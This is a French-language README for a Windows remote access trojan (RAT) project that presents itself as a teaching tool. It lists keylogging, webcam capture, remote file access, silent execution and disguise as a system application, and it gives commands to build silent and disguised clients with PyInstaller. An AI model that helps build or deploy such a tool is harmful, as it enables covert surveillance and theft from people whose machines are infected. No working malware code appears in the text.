# Projet de Démonstration RAT Windows

Un outil d'administration à distance (RAT) complet conçu pour l'éducation en cybersécurité et les démonstrations en classe.

## 🎯 Aperçu du projet

Ce projet est un outil d'administration à distance complet, comprenant des composants serveur, client et interface Web, spécialement conçu pour l'enseignement de la cybersécurité et les démonstrations d'attaque-défense.

## ⭐ Fonctionnalités principales

### 🖥️ Fonctionnalités RAT de base
- **Capture d'écran à distance** : Capture en temps réel de l'écran de la machine cible
- **Navigation de fichiers** : Navigation et manipulation du système de fichiers à distance
- **Informations système** : Obtention des informations de base de la machine cible
- **Messages popup** : Affichage de boîtes de message sur la machine cible

### 🔍 Fonctionnalités avancées
- **Surveillance du clavier** : Surveillance et enregistrement en temps réel des saisies clavier
- **Prise de photos** : Activation de la caméra pour prendre des photos
- **Exécution silencieuse** : Fonctionnement discret sans fenêtre de console
- **Déguisement d'application** : Déguisement en applications système pour améliorer la discrétion

### 🌐 Interface Web de gestion
- **Interface moderne** : Interface responsive Bootstrap
- **Surveillance en temps réel** : Mises à jour d'état en temps réel via WebSocket
- **Gestion visuelle** : Gestion graphique des clients
- **Contrôle multifonction** : Intégration de toutes les opérations de fonctionnalités RAT

## 📁 Structure du projet

```
RAT-Project/
├── Server/                     # Côté serveur
│   ├── Server.py              # Programme serveur principal
│   └── protocol.py            # Définition du protocole de communication
├── Client/                     # Côté client
│   ├── Client.py              # Client standard
│   ├── Client_Silent.py       # Version client silencieuse
│   └── modules/               # Modules de fonctionnalités
│       ├── screenshot.py      # Fonctionnalité de capture d'écran
│       ├── file_browser.py    # Navigation de fichiers
│       ├── keylogger.py       # Surveillance du clavier
│       ├── photo.py           # Prise de photos
│       └── popup.py           # Messages popup
├── web_interface/             # Interface Web de gestion
│   ├── app.py                 # Application Flask
│   ├── static/                # Ressources statiques
│   └── templates/             # Modèles HTML
├── build/                     # Configuration de compilation
│   ├── *.spec                 # Configuration PyInstaller
│   └── *.bat                  # Scripts de compilation
├── dist/                      # Sortie de compilation
└── docs/                      # Répertoire de documentation
```

## 🚀 Démarrage rapide

### 1. Préparation de l'environnement

```bash
# Exécuter le script de configuration de l'environnement
setup.bat

# Ou installer manuellement les dépendances
venv\Scripts\activate
pip install -r requirements.txt
```

### 2. Modes d'exécution

#### Mode ligne de commande
```bash
# Démarrer le serveur
venv\Scripts\activate
python Server/Server.py --port 4444

# Démarrer le client
python Client/Client.py --host 127.0.0.1 --port 4444

# Démarrer l'interface opérateur
python rat_operator/rat_operator.py
```

#### Mode interface Web (recommandé)
```bash
# Activer l'environnement virtuel
venv\Scripts\activate

# Démarrer l'interface Web de gestion
cd web_interface
python app.py

# Ouvrir dans le navigateur
http://localhost:5000
```

### 3. Compiler les fichiers exécutables

```bash
# Compiler tous les composants
cd build
build_all.bat

# Ou compiler individuellement
build_client.bat        # Compiler le client
pyinstaller server.spec # Compiler le serveur
```

## 🛠️ Instructions d'utilisation détaillées

### Utilisation de l'interface Web

1. **Démarrer le serveur** : Démarrer le serveur RAT intégré dans l'interface Web
2. **Connecter le client** : Exécuter le client pour se connecter au serveur
3. **Surveiller l'état** : Voir en temps réel l'état des clients connectés
4. **Exécuter les opérations** :
   - Cliquer sur le bouton "Capture d'écran" pour capturer l'écran
   - Utiliser "Surveillance du clavier" pour enregistrer les saisies clavier
   - Envoyer des "Messages popup" à la machine cible
   - Naviguer et télécharger des fichiers

### Utilisation de la version silencieuse

```bash
# Compiler la version silencieuse
cd build
pyinstaller client.spec

# Exécution silencieuse (sans fenêtre)
dist\client.exe --host IP_serveur --port 4444
```

### Compilation de la version déguisée

```bash
# Compiler la version déguisée
pyinstaller client_disguised.spec

# Le fichier généré se déguisera en application système
```

## 🔧 Configuration avancée

### Configuration personnalisée du serveur

```python
# Modifier dans Server.py
DEFAULT_PORT = 4444
DEFAULT_HOST = "0.0.0.0"
MAX_CLIENTS = 100
```

### Ajouter de nouveaux modules de fonctionnalités

1. Créer un nouveau module dans `Client/modules/`
2. Ajouter une nouvelle commande dans `protocol.py`
3. Enregistrer un nouveau gestionnaire dans `Client.py`
4. Mettre à jour l'interface Web pour ajouter la nouvelle fonctionnalité

## 📊 Architecture système

```
┌─────────────────┐    HTTP/WebSocket    ┌─────────────────┐
│   Interface Web │ ◄──────────────────► │  Application    │
│                 │                      │    Flask        │
└─────────────────┘                      └─────────┬───────┘
                                                   │
                                                   │ Intégration
                                                   │ intégrée
                                                   ▼
┌─────────────────┐    JSON/TCP         ┌─────────────────┐
│   CLI Opérateur │ ◄─────────────────► │  Serveur RAT    │
└─────────────────┘                     └─────────┬───────┘
                                                  │
                                                  │ JSON/TCP
                                                  ▼
                                        ┌─────────────────┐
                                        │   Agent Client  │
                                        │  ┌─────────────┐ │
                                        │  │Module       │ │
                                        │  │capture      │ │
                                        │  │d'écran      │ │
                                        │  │             │ │
                                        │  │Surveillance │ │
                                        │  │clavier      │ │
                                        │  │             │ │
                                        │  │Navigation   │ │
                                        │  │fichiers     │ │
                                        │  │             │ │
                                        │  │Prise de     │ │
                                        │  │photos       │ │
                                        │  └─────────────┘ │
                                        └─────────────────┘
```

